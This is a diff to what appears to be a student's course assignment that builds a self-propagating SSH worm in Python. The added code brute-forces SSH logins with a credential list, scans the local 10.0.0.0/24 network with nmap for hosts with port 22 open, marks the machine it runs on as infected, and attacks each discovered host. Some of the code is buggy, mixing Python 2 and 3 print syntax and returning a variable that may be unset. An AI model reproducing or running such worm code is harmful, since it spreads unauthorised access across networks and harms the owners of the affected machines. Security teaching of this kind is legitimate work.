@@ -156,22 +156,18 @@ def attackSystem(host):
 				
 	# Go through the credentials
 	for (username, password) in credList:
-		
-		# TODO: here you will need to
-		# call the tryCredentials function
-		# to try to connect to the
-		# remote system using the above 
-		# credentials.  If tryCredentials
-		# returns 0 then we know we have
-		# successfully compromised the
-		# victim. In this case we will
-		# return a tuple containing an
-		# instance of the SSH connection
-		# to the remote system. 
-		pass	
+
+		#call that function 
+		results = tryCredentials(host, username, password, ssh)
+
+		#local variable 
+		#if result is successful
+		if (results == 0):
+			attemptResults = ssh
 			
 	# Could not find working credentials
-	return None	
+	# return whatever we got from the attack (if results weren't successful, eff it, empty list then) 
+	return attemptResults	
 
 ####################################################
 # Returns the IP of the current system
@@ -183,7 +179,20 @@ def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	return None
+
+	# TODO: learn netifaces 
+
+	#make the ip address = to none 
+	ipAddress = None
+
+	for netFaces in interface:
+		address = netifaces.ifaddresses(netFaces)[2][0]['address']
+
+		#Yo we don't want address to be the loopback, literally anything else is okay for now 
+		if address != "127.0.0.1":
+			ipAddress = address
+
+	return ipAddress
 
 #######################################################
 # Returns the list of systems on the same network
@@ -195,7 +204,30 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
-	pass
+	
+
+	#Scans for hosts on the same network 
+	scanner = nmap.PortScanner()
+
+	scanner.scan("10.0.0.0/24", arguments="-p 22 --open")
+
+	hostInfo = scanner.all_hosts()
+
+	discoveredAddresses = []
+
+	for host in hostInfo:
+		#if state is UP 
+		if scanner[host].state() == "up":
+			#append it
+			discoveredAddresses.append(host)
+
+	return discoveredAddresses
+
+	
+
+
+
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -211,9 +243,18 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
-	pass
+	if isInfectedSystem():
+		print("Already infected")
+		exit(0)
+	else:
+		print "Infect process starting"
+		markInfected()
+
 
 # TODO: Get the IP of the current system
+netInterface = netifaces.interfaces()
+
+sourceIP = getMyIP(netInterface)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -221,6 +262,8 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
+
+networkHosts.remove(sourceIP)
 
 print "Found hosts: ", networkHosts
 
@@ -231,6 +274,9 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
+	# For simplicity and ease of reading 
+	print("sshInfo:")
+
 	print sshInfo
 	
 	
